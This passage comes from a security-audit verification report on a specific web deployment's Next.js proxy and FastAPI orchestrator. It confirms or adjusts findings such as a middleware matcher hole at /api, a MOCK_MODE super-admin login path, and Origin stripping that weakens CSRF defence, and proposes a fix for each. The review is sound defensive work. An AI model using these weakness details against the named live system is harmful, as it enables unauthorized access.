*Fix.* Make the trust conditional on the peer: only honour x-forwarded-for when request.client.host is the frontend container's address (or a configured CIDR), rather than on a global boolean. Independently, bind the orchestrator's published port to loopback or the tunnel-facing interface so the .env comment's premise becomes true. The sessions.py change needs an orchestrator container restart (cheap, not the model); the bind change is a compose edit and a recreate of the orchestrator service only.

### F003 — The middleware matcher has a hole at exactly `/api` — a console page there would render for signed-out visitors

**P3** · frontend-app · `frontend/middleware.ts:35` · verdict **ADJUSTED** · claimed P1

*Evidence.* export const config = {
  // Pages only: /api/* answers statuses (never redirects — a fetch cannot
  // follow one to a login PAGE) …  authRedirect re-checks the same exclusions, so
  // widening this matcher cannot silently widen the gate.
  matcher: ['/((?!api|_next|.*\\..*).*)'],
};

Evaluating that regex against real paths:
  /api            → skipped   (lookahead `(?!api)` fails at position 1)
  /apidocs        → skipped
  /api/chat       → skipped
  /docs           → RUNS

The pure gate WOULD have caught it — frontend/lib/auth.ts:257 tests `pathname.startsWith('/api/')` with a trailing slash, so `authRedirect('/api', false)` returns '/login' — but the matcher means authRedirect is never invoked for that path. No test covers the matcher: tests/auth-middleware.test.ts exercises only the pure function.

*Impact.* Latent today (no page exists at /api), live the moment the developer console lands at frontend/app/api/page.tsx — which is the plan. That page would be served to any anonymous visitor: its shell, its nav, whatever it renders before /api/auth/me resolves, and — if it ever optimistically renders a key list or a workspace name from cache — real data. The file's own comment asserts the opposite ('authRedirect re-checks the same exclusions'), which is true only in the widening direction; the narrowing is done by the matcher and nothing re-checks that.

*Verification.* The regex fact is right and I reproduced it. With `matcher: ['/((?!api|_next|.*\\..*).*)']` (frontend/middleware.ts:35), compiling `^/((?!api|_next|.*\..*).*)$` and testing gives: /api false, /apidocs false, /api/chat false, /docs true, /_next/static/x.js false, /admin true. So the gate does not run for /api, and frontend/lib/auth.ts:256-258 does test `pathname.startsWith('/api/')` WITH the slash, so authRedirect('/api', false) would indeed return '/login' if it were ever called. `grep -rn matcher tests/auth-middleware.test.ts` → no hits, so the matcher is genuinely untested. But P1 overstates it on two counts I checked. There is no page at that path — `find app/api -name 'page.tsx'` is empty — so nothing is served ungated today; a GET /api is a 404. And if a console page did land there, the leak is the shell only: every admin page under app/admin is a client component (`use client` on all 20 of them; the only server components are app/layout.tsx, app/page.tsx, /login, /accept-invite, /access-removed and /share/[token]), and their data arrives over /api/admin/*, which 401s upstream with no cookie (app/api/admin/[...path]/route.ts:1-11 documents exactly that). So the impact is a flash of chrome, not data. I also found a second hole of the same class the auditor missed — see the `missed` list.

*Exploitable today.* no — latent. It bites only once a page.tsx exists under app/api (or at any path starting with the literal 'api', e.g. /apidocs), and even then it exposes page chrome rather than data.

*Fix.* frontend/middleware.ts:35 → `matcher: ['/((?!api/|_next/|.*\\..*).*)']`. I verified the slashed form: /api now matches (gate runs, signed-out → /login) while /api/chat, /api/auth/me and /_next/static/x.js stay excluded. Add a test beside tests/auth-middleware.test.ts that compiles config.matcher and asserts the selected set, so the matcher and authRedirect are pinned together.

*Fix risk.* Very low; the change narrows the exclusion by one character on each prefix and the assertion above covers the regression. Frontend rebuild and container restart only.

### F005 — proxyToOrchestrator discards every response header except content-type — Retry-After and rate-limit headers cannot survive it

**P3** · frontend-app · `frontend/lib/proxy.ts:64` · verdict **CONFIRMED** · claimed P2

*Evidence.* const responseHeaders = new Headers();
  responseHeaders.set(
    'content-type',
    upstream.headers.get('content-type') ?? 'application/json',
  );
  responseHeaders.set('cache-control', 'no-store');
  for (const c of setCookiesOf(upstream.headers)) {
    responseHeaders.append('set-cookie', c);
  }

  return new Response(await upstream.arrayBuffer(), { … });

This is why the admin download endpoints had to bypass the helper entirely — app/api/admin/[...path]/route.ts:11-16 says so and re-implements the relay at 82-98.

*Impact.* Today: harmless (the login 429 at orchestrator/app/authn/api.py:86 sets no Retry-After, so nothing is lost). For the build: every quota response the developer API returns — Retry-After, RateLimit-Limit / RateLimit-Remaining / RateLimit-Reset, ETag, WWW-Authenticate — is silently stripped if it is proxied through this helper, and the client sees a bare 429 with no idea when to retry. The `await upstream.arrayBuffer()` also means nothing proxied this way can stream, so a future SSE or large export through /api/admin would buffer whole.

*Verification.* frontend/lib/proxy.ts:63-76, read in full: a fresh `new Headers()` gets exactly `content-type` (defaulted to application/json), `cache-control: no-store`, and the upstream Set-Cookie list. Nothing else survives, and the body is `await upstream.arrayBuffer()` so nothing proxied this way can stream. The auditor's corroboration is right too: app/api/admin/[...path]/route.ts:11-16 states in its header comment that the two download endpoints bypass the helper because 'proxyToOrchestrator relays only content-type', and re-implements the relay at 82-98 with content-disposition, content-length and `new Response(upstream.body, …)`. The 'harmless today' half also checks out — orchestrator/app/authn/api.py:82-87 raises the login 429 with `detail` only and no Retry-After, so nothing is currently being stripped. A detail the auditor did not mention: with `redirect: 'manual'` at proxy.ts:54, an upstream 3xx is relayed as a bodyless 3xx with no `location`, which is the same bug in a different clothing.

*Exploitable today.* no — not a security issue at all today; it is a correctness ceiling that the developer API's quota semantics (Retry-After, RateLimit-*, WWW-Authenticate, ETag) would hit immediately.

*Fix.* Give proxyToOrchestrator an explicit response-header allowlist in the shape app/api/artifacts/[[...path]]/route.ts:237-245 (FORWARD_RESPONSE_HEADERS) already uses, adding retry-after, ratelimit-limit/remaining/reset, www-authenticate, etag, location, content-disposition and content-length. Add an opt-in streaming mode returning `upstream.body` so the admin download duplication at app/api/admin/[...path]/route.ts:59-98 can be folded back in.

*Fix risk.* Low, with one trap: relaying content-length while buffering the body is only safe if the bytes are passed through unchanged — which is precisely why the admin route's comment at line 89 says 'Only safe because the body below is piped through byte-for-byte'. Allowlist content-length only on the streaming path. Frontend rebuild only.

### F006 — proxyToOrchestrator sends no abort signal, so a closed tab leaves the upstream request running — and no proxy sets a timeout

**P3** · frontend-app · `frontend/lib/proxy.ts:47` · verdict **ADJUSTED** · claimed P2

*Evidence.* upstream = await fetch(`${orchestratorUrl()}${upstreamPath}`, {
      method: req.method,
      headers,
      body: …,
      cache: 'no-store',
      redirect: 'manual',
    });          // ← no `signal`

Audited every route handler for `signal: req.signal`. Missing on: all nine /api/auth/* routes, /api/history/[...path], /api/conversations/[id]/share, /api/public/shares/[token] (all via lib/proxy.ts), plus app/api/chat/active/route.ts:29, chat/compact/route.ts:16, chat/stop/route.ts:17, chat/salesforce/cancel/route.ts:20, chat/salesforce/[id]/route.ts:30. Present on all ten streaming/file routes. `grep -rn 'AbortSignal.timeout' app lib` → no matches anywhere.

*Impact.* A user who closes a tab mid-query leaves the orchestrator finishing an expensive analytics aggregation nobody will read; under the admin console's date-range queries that is real database work. Because no fetch sets a deadline either, a wedged-but-listening orchestrator — the exact failure mode recorded in the vLLM-availability work, where /health stays green while the engine is dead — holds each proxied request open for undici's default, tying up Node sockets and making the frontend look hung rather than erroring.

*Verification.* The audit is accurate. frontend/lib/proxy.ts:46-56 passes method, headers, body, cache and redirect — no `signal`. `grep -rn 'signal:' app lib` returns it on exactly the ten streaming/file routes the auditor lists (upload, upload/chunked, audio/transcribe, uploads/*, artifacts, reports, chat/attach, chat/requests, admin download, chat) and nowhere else; app/api/chat/active/route.ts:29-36, chat/compact/route.ts:16-25 and chat/stop/route.ts:17-26 I read directly and none passes one. `grep -rn AbortSignal app lib` returns only type annotations on client-side helpers — no `AbortSignal.timeout` anywhere in the tree. Adjusted on the fix, not the fact: the proposed blanket 'pass req.signal in the five chat status routes' is wrong for at least one of them. POST /api/chat/stop exists precisely because closing the stream no longer stops the model (its own header comment says so) — tying it to req.signal would abort the cancellation at the moment the tab that requested it goes away, which is the common case. Same argument for /api/chat/compact.

*Exploitable today.* no — availability/hygiene, not security. It bites on a wedged-but-listening orchestrator (the documented /health-green-dead-engine mode), where every proxied JSON request hangs for undici's default instead of erroring.

*Fix.* Add `signal: req.signal` to proxyToOrchestrator (lib/proxy.ts:47) and to the read-only status route app/api/chat/active/route.ts:29, but NOT to /chat/stop or /chat/compact — those are fire-and-forget side effects that must outlive the tab. Separately give every non-SSE upstream call a deadline, `AbortSignal.any([req.signal, AbortSignal.timeout(ms)])`, with a few seconds for JSON proxies and no deadline for the SSE pipes.

*Fix risk.* Medium if applied bluntly: aborting POSTs that must complete (stop/compact) converts a tidy-up into a leaked running generation, and a too-short JSON deadline turns a slow admin analytics aggregation into a spurious 504. Pick the budget from the slowest real admin query. Frontend rebuild and restart only.

### F007 — MOCK_MODE is a complete authentication bypass reachable through a single environment variable

**P3** · frontend-app · `frontend/lib/mockApi.ts:87` · verdict **ADJUSTED** · claimed P2

*Evidence.* if (endpoint === 'login' && req.method === 'POST') {
    …
    if (typeof body.email !== 'string' || !body.email ||
        typeof body.password !== 'string' || !body.password) {
      return json(401, { detail: 'Incorrect email or password.' });
    }
    return json(200, MOCK_ME, MOCK_SESSION_COOKIE);   // ← any non-empty pair signs in
  }

MOCK_ME (lines 51-57) is `workspace: { role: 'super_admin' }` with capabilities ['members.read','audit.read','workspace_content.read'], and hasMockSession (line 60-62) accepts ANY value for the ts_session cookie:
  return /(?:^|;\s*)ts_session=/.test(req.headers.get('cookie') ?? '');

The branch is present in every auth route, e.g. app/api/auth/login/route.ts:16:
  if (process.env.MOCK_MODE === 'true') return handleMockAuth(req, ['login']);

*Impact.* Safe in the current deployment — `docker inspect sf-local-ai-frontend-1` shows MOCK_MODE=false and compose.yaml:308 pins `${MOCK_MODE:-false}` in `environment:`, which overrides env_file. But it is one mistyped variable away from an unauthenticated super-admin session, there is no assertion that refuses to start in a production build, and the launcher has a documented history of writing fallback values into generated.env. The blast radius is the whole workspace.

*Verification.* The code is exactly as quoted. frontend/lib/mockApi.ts:50-57 MOCK_ME carries `workspace.role: 'super_admin'` with capabilities members.read / audit.read / workspace_content.read; :59-62 `hasMockSession` is `/(?:^|;\s*)ts_session=/.test(cookie)` — presence only, any value; :87-104 login returns 200 + MOCK_SESSION_COOKIE for any non-empty email/password pair. But the finding's own impact paragraph concedes it is not live, and I confirmed both mitigations independently: `docker inspect sf-local-ai-frontend-1` shows MOCK_MODE=false and NODE_ENV=production, and compose.yaml:308 pins `MOCK_MODE: ${MOCK_MODE:-false}` inside `environment:`, which takes precedence over the `env_file: *generated-env` at :305 — so even a stray MOCK_MODE=true written into generated.env (the launcher's documented failure mode) does NOT reach the container; it would take a shell-level export of MOCK_MODE=true at compose time. That is a materially narrower door than 'one mistyped variable'. This is defence-in-depth, not a live bypass.

*Exploitable today.* no — MOCK_MODE=false in the running container and compose.yaml:308 overrides env_file. Reaching it needs an operator to export MOCK_MODE=true in the shell that runs compose, i.e. an attacker who already has the deploy account.

*Fix.* At module load in frontend/lib/mockApi.ts, `if (process.env.MOCK_MODE === 'true' && process.env.NODE_ENV === 'production') throw new Error(...)`. A container that refuses to start is strictly better than one that silently signs everybody in as super_admin, and it costs nothing in dev where NODE_ENV is 'development'.

*Fix risk.* Very low. The one thing to check is that no CI job or preview deploy runs a production build with MOCK_MODE=true — grep the workflows before landing it, or the guard turns a green pipeline red. Frontend rebuild only.

### F008 — The admin nav links to /admin/analytics/models, which has no page

**P3** · frontend-app · `frontend/app/admin/layout.tsx:136` · verdict **CONFIRMED** · claimed P2

*Evidence.* {
            href: '/admin/analytics/models',
            label: 'Models',
            icon: <IconCpu size={15} />,
          },

but `ls frontend/app/admin/analytics/` lists only: chat, gpu, leaderboards, nodes, page.tsx, performance, research, salesforce, search, voice. There is no `models` directory anywhere under app/. (The other hit, app/admin/analytics/leaderboards/page.tsx:259, is the API path 'analytics/models' passed to useAnalytics — that one is fine.)

*Impact.* Every super admin — the only role for which analytics.read renders this group — sees a 'Models' item in the rail that lands on the Next 404 page. It is also in the mobile header, which flattens all groups (layout.tsx:331-342), so it is not hidden on small screens either.

*Verification.* frontend/app/admin/layout.tsx:136-139 has `{ href: '/admin/analytics/models', label: 'Models', icon: <IconCpu size={15} /> }`. `ls app/admin/analytics/` returns chat, gpu, leaderboards, nodes, page.tsx, performance, research, salesforce, search, voice — no models. I also ruled out the two ways it could still work: next.config.mjs has no `rewrites` or `redirects` (only `headers()`), and `find app/admin -maxdepth 3 -name '*[*'` returns only app/admin/members/[id], so there is no catch-all segment under analytics to absorb it. The auditor's note about the other grep hit is right too — app/admin/analytics/leaderboards/page.tsx:259 passes the string 'analytics/models' to useAnalytics as an API path, which is a different thing and is fine.

*Exploitable today.* no — a broken link, not a vulnerability. Every super admin (the only role for which the analytics group renders) sees a rail item that lands on the Next 404.

*Fix.* Either delete the nav entry at frontend/app/admin/layout.tsx:136-139, or add app/admin/analytics/models/page.tsx — the data already exists, since the leaderboards page consumes the analytics/models endpoint. Cheapest guard against the class: a test that walks app/admin for page.tsx files and asserts every internal href in the nav array resolves to one.

*Fix risk.* None. Frontend rebuild only.

### F009 — The BFF strips Origin, disabling the orchestrator's CSRF second layer for all browser writes

**P3** · frontend-app · `frontend/lib/proxy.ts:25` · verdict **CONFIRMED** · claimed P2

*Evidence.* const headers: Record<string, string> = {};
  const cookie = req.headers.get('cookie');
  if (cookie) headers.cookie = cookie;
  const contentType = req.headers.get('content-type');
  if (contentType) headers['content-type'] = contentType;
  … (x-forwarded-for, x-forwarded-proto, user-agent)

No `origin`, no `referer` — and every per-route proxy builds its header object the same explicit way. The orchestrator's middleware only fires when Origin is present:

orchestrator/app/main.py:244-249
  if request.method not in ("GET", "HEAD", "OPTIONS"):
      origin = request.headers.get("origin")
      if origin and origin not in _TRUSTED_ORIGINS:
          return JSONResponse(status_code=403, …)

main.py:235 states this is deliberate ('the Next.js proxy strips Origin … so proxied traffic passes untouched').

*Impact.* Not exploitable today: `samesite="lax"` (orchestrator/app/authn/sessions.py:199) withholds ts_session from cross-site POST/PUT/DELETE, so the write never carries a session. But it means the entire CSRF defence for browser traffic is that one cookie attribute, and the BFF — the only place a token or Origin check could be enforced for proxied requests — enforces nothing. The moment any cookie-authenticated state change becomes reachable by a top-level GET navigation (a 'revoke this key' link in the planned console, say), Lax stops protecting it and there is no second layer.

*Verification.* Both halves verified. frontend/lib/proxy.ts:25-43 builds the upstream header object explicitly — cookie, content-type, x-forwarded-for, x-forwarded-proto, user-agent — and never copies `origin` or `referer`. orchestrator/app/main.py:243-254 `_reject_cross_site_writes` fires only `if origin and origin not in _TRUSTED_ORIGINS`, and main.py:236-238 says the stripping is deliberate ('the Next.js proxy strips Origin (server-to-server), so proxied traffic passes untouched'). _TRUSTED_ORIGINS is `set(settings.cors_allow_origins)`, which config.py:1174-1181 defaults to http://localhost:3000,http://127.0.0.1:3000. The finding is honest that this is not exploitable today and that is correct: orchestrator/app/authn/sessions.py:199 sets `samesite="lax"`, which withholds ts_session from any cross-site POST/PUT/DELETE, so the forged write arrives unauthenticated. The residual is exactly as stated — Lax is the entire CSRF defence for browser traffic, and Lax does not cover a top-level GET navigation, so any cookie-authenticated state change ever reachable by GET (a 'revoke this key' link in the planned console) has no second layer.

*Exploitable today.* no — SameSite=Lax blocks the cross-site write before it carries a session. It becomes exploitable the moment a cookie-authenticated mutation is reachable by top-level GET navigation, which needs no attacker position beyond getting a signed-in admin to click a link.

*Fix.* Enforce Origin in the BFF, where the browser's header is still present: in frontend/lib/proxy.ts, reject any request whose method is not GET/HEAD/OPTIONS and whose `origin` header is present and is not this deployment's own origin, before the upstream fetch. Server-to-server callers send no Origin and are unaffected. Apply the same check in the per-route proxies that build their own headers (app/api/chat/route.ts, chat/compact, chat/stop, admin download). Then keep every developer-API mutation non-GET.

*Fix risk.* Low but not zero: the allowlist must include the Cloudflare hostname (https://ai.techsarasolutions.com) as well as the LAN origin, or signed-in users on the tunnel start getting 403s on every write. Derive it from the same env as CORS_ALLOW_ORIGINS rather than hardcoding. Frontend rebuild and restart; no orchestrator change needed.

### F010 — proxyToOrchestrator round-trips request bodies through a UTF-8 string, corrupting any binary payload

**P3** · frontend-app · `frontend/lib/proxy.ts:53` · verdict **CONFIRMED** · claimed P2

*Evidence.* body:
        req.method === 'GET' || req.method === 'HEAD'
          ? undefined
          : await req.text(),

`req.text()` decodes the bytes as UTF-8 (replacing anything invalid with U+FFFD) and fetch re-encodes them. Contrast the streaming routes, which pass the stream itself: app/api/upload/route.ts:31-34 `body: req.body, duplex: 'half'`.

*Impact.* No live bug — nothing binary currently goes through this helper. It is a trap: the next person who adds a multipart or octet-stream POST under /api/auth, /api/history, /api/admin or /api/conversations gets silent data corruption rather than an error, and the corruption only shows up in the uploaded artifact.

*Verification.* frontend/lib/proxy.ts:50-53 is `body: req.method === 'GET' || req.method === 'HEAD' ? undefined : await req.text()`, and `req.text()` decodes as UTF-8 with U+FFFD substitution before fetch re-encodes. The contrast the auditor draws is accurate: app/api/upload/route.ts:31-34 passes `body: req.body` with `duplex: 'half'`. And the 'no live bug' qualifier holds — I enumerated the helper's callers (app/api/auth/*, app/api/history/[...path], app/api/admin/[...path] non-download, app/api/conversations/[id]/share, app/api/public/shares/[token]) and every one of them is JSON or a bodyless GET.

*Exploitable today.* no — latent. It becomes silent data corruption the first time anyone adds a multipart or octet-stream POST under one of the helper's prefixes.

*Fix.* In frontend/lib/proxy.ts, switch to `body: req.body` with `duplex: 'half'` — behind the bounded-read wrapper from F001 for the JSON routes — or at minimum `await req.arrayBuffer()`, with a comment saying why so it is not reverted to `.text()`.

*Fix risk.* Low, but it interacts with F001: a raw `req.body` passthrough removes the natural place to impose the size cap, so land the bounded reader first and make the streaming mode opt-in per route rather than the default. Frontend rebuild only.

### F011 — Two route-handler comments assert an auth posture the orchestrator no longer has

**P3** · frontend-app · `frontend/app/api/reports/[filename]/route.ts:59` · verdict **CONFIRMED** · claimed P2

*Evidence.* // Forward the session cookie for parity with the other proxies;
          // /reports is auth-free today but must not break if that changes.

It is not auth-free — orchestrator/app/main.py:1076-1078:
@app.get("/reports/{filename}")
async def get_report(
    filename: str, user: UserRow = Depends(require_user)
) -> FileResponse:

The same staleness sits upstream at orchestrator/app/main.py:235, which still says '/chat and /reports* remain auth-free' while main.py:1657-1659 raises 401 without a principal (verified live: POST http://127.0.0.1:8080/chat → 401 {"detail":"Sign in required."}).

*Impact.* No runtime effect. It matters because these are the comments an implementer reads when deciding whether a new surface needs its own gate, and both of them currently describe a pre-2026-09-01 world. A reader who trusts them concludes the orchestrator has auth-free routes and designs the developer API accordingly.

*Verification.* Both stale comments are there and both are wrong. frontend/app/api/reports/[filename]/route.ts:58-60 says '/reports is auth-free today but must not break if that changes', while orchestrator/app/main.py:1076-1079 is `@app.get("/reports/{filename}")` / `async def get_report(filename: str, user: UserRow = Depends(require_user))` with a docstring saying it is 'the OWNER's only'. And orchestrator/app/main.py:232-233 still reads 'V2 (V2-DESIGN §3c): /auth + /history are the account boundary; /chat and /reports* remain auth-free', which the calibration example in my brief already establishes is false for /chat (main.py:1655-1659 raises 401 without a principal). Documentation-only; there is no runtime effect.

*Exploitable today.* no — comments, not code. The cost is that these are the comments an implementer reads when deciding whether a new surface needs its own gate, and both describe a pre-2026-09-01 world.

*Fix.* Two comment edits: frontend/app/api/reports/[filename]/route.ts:58-60 → say the route requires a session and is owner-scoped, citing orchestrator/app/main.py:1076; orchestrator/app/main.py:232-233 → drop the '/chat and /reports* remain auth-free' clause and cite main.py:1657.

*Fix risk.* None. No rebuild required for correctness, though the orchestrator comment rides along with whatever the next orchestrator image build is. No restart, no window.

### N001 — The matcher's dot rule excludes any path with a dot in ANY segment, while authRedirect only inspects the LAST segment — a second, wider hole of F003's class

**P3** · frontend-app · `frontend/middleware.ts:35` · verdict **FOUND IN VERIFICATION**

*Evidence.* The matcher's third alternative is `.*\..*`, applied to the whole remainder of the path, so any path containing a dot anywhere is skipped by the middleware entirely. The pure gate it is supposed to mirror is narrower: frontend/lib/auth.ts:259-260 takes only `pathname.slice(pathname.lastIndexOf('/') + 1)` and returns null only `if (lastSegment.includes('.'))`. So `/a.b/admin` is skipped by the matcher but WOULD have been gated by authRedirect — the two halves disagree, in the direction that lets requests through. This is the same defect F003 reports for the literal prefix `api`, but the auditor stopped at that one alternative and asserted in the same breath that 'widening this matcher cannot silently widen the gate' (middleware.ts:32-34), which is only true for widening, never for the narrowing the matcher itself performs.

*Impact.* Latent today, for the same reason F003 is: no page route contains a dot in a non-final segment (the only dynamic page segments are /share/[token], /admin/members/[id] and /admin/members/[id]/conversations/[cid]), and the admin pages are client components whose data 401s upstream regardless. It matters because it is the SAME untested assumption that produced F003, and a developer console with, say, a versioned path segment would walk straight into it.

*Fix.* Fix it with F003 in one change: `matcher: ['/((?!api/|_next/|.*\\..*).*)']` still leaves this alternative in place, so additionally anchor the dot rule to the last segment (`[^/]*\.[^/]*$`) so it matches auth.ts:259-260 exactly, and add the matcher-compilation test F003 already proposes — asserting the matcher and authRedirect agree on a table of paths is what catches both holes at once. Frontend rebuild only; no restart of anything else.

### N003 — There is no rate limiting anywhere in the frontend BFF, and the login throttle is the only rate limiter in the system

**P3** · frontend-app · `frontend/lib/proxy.ts:21` · verdict **FOUND IN VERIFICATION**

*Evidence.* The only rate limiter I can find in either half of the stack is the login throttle: orchestrator/app/db.py:712 `CREATE TABLE IF NOT EXISTS login_throttle`, with store.throttle_check / throttle_failure / throttle_clear (orchestrator/app/authn/store.py:790-835) called from exactly one place, orchestrator/app/authn/api.py:84-107. Nothing in frontend/ counts requests at all. app/api/public/shares/[token]/route.ts is the one anonymous proxy route and it forwards each hit straight through `proxyToOrchestrator` with no counter of its own — its own header comment calls it 'the ONE anonymous endpoint in this app', and orchestrator/app/share_api.py:44 shows the share code is aware its view bucket is 'KEYED BY ATTACKER-CHOSEN DATA', so the token lookup has been thought about, but neither side throttles the attempt rate.

*Impact.* Today this is bounded: the only anonymous surfaces are share-token lookup and login, and login has its own (forgeable-keyed, see F002) throttle. It is listed because it is the single largest gap between what exists and what a public developer API needs. API keys, /v1 SSE streams, background jobs and outbound webhooks all assume a quota layer — per-key request rates, concurrent-stream caps, a job-submission ceiling — and there is currently no component in the request path that counts anything. Combined with F001 (no body cap) and F005 (Retry-After cannot survive the proxy), the three together mean the platform has neither a way to enforce a limit nor a way to tell a client one was hit.

*Fix.* Not a patch — a design item to settle before /v1 ships: put the quota layer in the orchestrator where the API key is resolved (so it cannot be bypassed by hitting :8080 directly, which the LAN can), key it on the key id rather than on any forwarded IP header, and land F005's response-header allowlist first so Retry-After and RateLimit-* can actually reach the client. No restart implications until it is built.

### F032 — The edge middleware never runs for the literal path /api — the planned developer console page at /api would load for signed-out visitors

**none** · authn-authz · `frontend/middleware.ts:35` · verdict **ADJUSTED** · claimed P2

*Evidence.* middleware.ts:30-36 — `export const config = { matcher: ['/((?!api|_next|.*\\..*).*)'] }`. The negative lookahead rejects any pathname whose first segment begins with the literal "api", so `/api` itself is excluded from the matcher and `middleware()` (middleware.ts:21-28) never executes for it. The pure decision function would have gated it — lib/auth.ts:257-259 only short-circuits on `pathname.startsWith('/api/')` (with the trailing slash), so `authRedirect('/api', false)` falls through to lib/auth.ts:271-275 and returns '/login' — but it is never called. frontend/app/api/ currently holds only route handlers (admin, artifacts, audio, auth, chat, conversations, debug, history, public, reports, upload, uploads); there is no page.tsx there today.

*Impact.* The developer console is specified to live at /api. Dropping a page.tsx into frontend/app/api/ renders it at a path the edge gate provably does not cover, so a signed-out visitor gets the console shell rather than a bounce to /login. The data would still 401 upstream, but the page — including any nav revealing that the platform has projects, keys, quotas and webhooks — renders to anonymous visitors, and the team would reasonably assume middleware covers it because authRedirect's own logic says it should.

*Verification.* The regex claim is correct. frontend/middleware.ts:30-36 is matcher: ['/((?!api|_next|.*\\..*).*)'] - for the pathname '/api' the negative lookahead is evaluated at the position right after the leading slash against the remainder 'api', so it fails and the route never matches; middleware() at :21-28 does not run. And frontend/lib/auth.ts:257 does test startsWith('/api/') with the trailing slash, so authRedirect('/api', false) would indeed fall through to :275 and return '/login'. Worth adding: the exclusion is broader than the finding says - anything whose first segment merely begins with 'api' ('/apiary', '/api-console') is also unmatched. But the severity is none today and the framing is off. There is no page.tsx anywhere under frontend/app/api (it holds only the route-handler directories admin, artifacts, audio, auth, chat, conversations, debug, history, public, reports, upload, uploads), and by middleware.ts's own docstring the gate decides 'from cookie PRESENCE alone' with 'validity is the server's job' - so even when it does run it is a UX bounce, not an authorization control. Calling a missing bounce a P2 authz defect overstates what the middleware is.

*Exploitable today.* no. Nothing is served at /api today, and the control in question never checks cookie validity anyway - a forged cookie of any content satisfies it.

*Fix.* Mount the developer console at a path the matcher already covers (/developers or /console) rather than inside the route-handler namespace; if /api is kept, narrow the matcher to '/((?!api/|_next/|.*\\..*).*)' and add a unit test asserting authRedirect('/api', false) === '/login'. Either way the console's own data fetches must 401 and the page must render nothing sensitive before /api/auth/me resolves - that, not the matcher, is the control.

*Fix risk.* Frontend-only; a rebuild and restart of the frontend container. No orchestrator, model or production window. Widening the matcher makes middleware run on paths it never ran on before, so check that no static asset or route handler under a name starting 'api' starts getting redirected.

### F024 — No route declares a response_model, so the generated OpenAPI describes no response shapes at all

**none** · orchestrator-core · `orchestrator/app/main.py:988` · verdict **CONFIRMED** · claimed P2

*Evidence.* `grep -rn 'response_model' orchestrator/app/ --include=*.py` returns zero hits across all 113 routes. Handlers return bare containers — e.g. `async def health() -> dict:` (main.py:988), `def list_conversations(...) -> list:` (history.py:115-119), `async def chat_request_status(...) -> dict:` (main.py:3711). The live /openapi.json consequently gives every 200 the generic `{"description":"Successful Response","content":{"application/json":{"schema":{}}}}`.

*Impact.* The OpenAPI document is half a contract: request bodies are typed, responses are not. A generated SDK or a docs site built from it can describe what to send and nothing about what comes back — which is most of the value of publishing a schema. It also means no response is validated on the way out, so an internal field added to a dict silently becomes part of the public payload.

*Verification.* `grep -rn 'response_model' orchestrator/app/ --include=*.py` returns zero hits. Handlers return bare containers — main.py:989 `async def health() -> dict:`, main.py:3712 `async def chat_request_status(...) -> dict:`. Live confirmation: /openapi.json gives /health's 200 as `{"schema":{"additionalProperties":true,"type":"object","title":"Response Health Health Get"}}` — an untyped object, i.e. no response shape. I mark corrected_severity 'none' because this is a design recommendation for a surface that does not exist yet, not a defect: it is not exploitable, and the finding itself says not to retrofit the 113 existing routes.

*Exploitable today.* no. No attacker position; this is an SDK-generation and output-validation quality point.

*Fix.* Declare explicit Pydantic response models on every /v1 route from the first commit and set response_model_exclude_none=True, so the published schema is complete and the serializer enforces the boundary — an internal dict key added later then cannot silently become part of the public payload.

*Fix risk.* None today (nothing changes). When applied to /v1 it is a build-time discipline, no restart implications beyond a normal deploy.

### F025 — Single uvicorn worker with all request lifecycle state in process memory — the /v1 surface cannot be scaled horizontally as designed

**none** · orchestrator-core · `orchestrator/Dockerfile:22` · verdict **ADJUSTED** · claimed P2

*Evidence.* `CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8080", "--timeout-graceful-shutdown", "90"]` — no `--workers`. The state that matters is per-process: `_live_generations: dict = {}` (main.py:472), `_resuming` and `_background_tasks` (main.py:483), the admission lanes (admission.py builds them per event loop, see the module docstring's "Per event loop, like the breaker registry"), and the breaker registry. `GET /chat/active` (main.py:3696) literally enumerates this process's dict, and `GET /chat/requests/{intent_id}` reports `"live": _live_generation_for(row["generation_id"]) is not None` (main.py:3736) — true only for this process.

*Impact.* Adding a second worker or a second replica today would make /chat/attach, /chat/active and /chat/stop answer from whichever process the load balancer happened to pick, producing false 404s and false "not live". The durable half exists (chat_requests rows, the continuity sweep), which is why a restart recovers — but the in-process half is authoritative for attach. Any /v1 background-jobs design must therefore be durable-first, not registry-first.

*Verification.* Facts verified, including the parts the finding got slightly wrong. The CMD citation points at orchestrator/Dockerfile:22, which is the SUPERSEDED build (its own header, lines 2-4); but the live container runs the identical command — `docker inspect` returns `["uvicorn","app.main:app","--host","0.0.0.0","--port","8080","--timeout-graceful-shutdown","90"]` with no --workers, and Dockerfile.cuda:68 / Dockerfile.cpu:72 match. The process-local state is real: main.py:3702-3705 /chat/active literally enumerates this process's `_live_generations` dict, main.py:3736 reports `"live": _live_generation_for(...) is not None`, and admission.py:196-202 builds Lanes per event loop. Severity 'none' because the single worker is not a bug — it is the correct configuration GIVEN the in-process registry, and nothing is broken today. It is a genuine and well-argued constraint on the /v1 background-jobs design.

*Exploitable today.* no. It would become a source of false 404s and false 'not live' only if someone added a worker or a replica without redesigning first.

*Fix.* No code change today. For /v1, build background jobs on the durable chat_requests lifecycle (main.py:1109-1120 plus the continuity sweep) and a webhook delivery table, and treat _live_generations purely as a fast path for 'is it live in this process'. Then a second replica is a config change, not a redesign.

*Fix risk.* None today. The risk is the opposite action — adding --workers or a replica to the current image would silently break /chat/attach, /chat/active and /chat/stop; add a comment on the Dockerfile CMD saying so.

